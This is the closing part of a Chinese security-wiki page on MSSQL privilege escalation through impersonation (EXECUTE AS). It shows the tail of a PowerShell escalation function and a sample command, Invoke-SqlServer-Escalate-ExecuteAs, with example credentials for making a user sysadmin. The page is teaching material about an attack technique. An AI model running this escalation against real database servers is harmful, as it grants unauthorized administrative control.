<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span>$<span class="n">VerifySysadmin</span><span class="w"> </span><span class="o">-</span><span class="nb">eq</span><span class="w"> </span><span class="mi">1</span><span class="p">){</span>
<span class="w">                </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] Success - $UsertoElevate is now a sysadmin!&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">foreground</span><span class="w"> </span><span class="s">&quot;green&quot;</span>
<span class="w">                </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] All Done.&quot;</span><span class="w">          </span>
<span class="w">            </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">                </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] Failed - Something went wrong!.&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">foreground</span><span class="w"> </span><span class="s">&quot;red&quot;</span>
<span class="w">                </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] All Done.&quot;</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">Close</span><span class="w"> </span><span class="n">db</span><span class="w"> </span><span class="n">connection</span>
<span class="w">        </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span><span class="w">                        </span>
<span class="w">    </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">         </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] Sorry, the $ConnectUser account can&#39;t impersonate any sysadmins.&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">foreground</span><span class="w"> </span><span class="s">&quot;red&quot;</span><span class="w"> </span>
<span class="w">         </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] All done.&quot;</span><span class="w"> </span>
<span class="w">    </span><span class="p">}</span>

<span class="p">}</span>
</code></pre></div>

<p><img alt="9.png" src="../resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId38.png" /></p>
<div class="codehilite"><pre><span></span><code>Invoke-SqlServer-Escalate-ExecuteAs -SqlUser MyUser1 -SqlPass MyPassword! -SqlServerInstance WIN-80LVKKRM5UA
</code></pre></div>

<p><img alt="10.png" src="../resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId39.png" /></p>
<p>总的来说，利用这个来提权也不算是漏洞，毕竟可能是运维人员想要的正常功能，然后被攻击者利用，达到提权sysadmin的目的。</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Mtab%E4%B9%A6%E7%AD%BE%E5%AF%BC%E8%88%AA%E7%A8%8B%E5%BA%8F/Mtab%E4%B9%A6%E7%AD%BE%E5%AF%BC%E8%88%AA%E7%A8%8B%E5%BA%8F%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Mtab%E4%B9%A6%E7%AD%BE%E5%AF%BC%E8%88%AA%E7%A8%8B%E5%BA%8F/Mtab%E4%B9%A6%E7%AD%BE%E5%AF%BC%E8%88%AA%E7%A8%8B%E5%BA%8F%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Mtab书签导航程序存在SQL注入漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Mssql%20%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Mssql%20%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-link">
        Mssql 受信用数据库提权
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>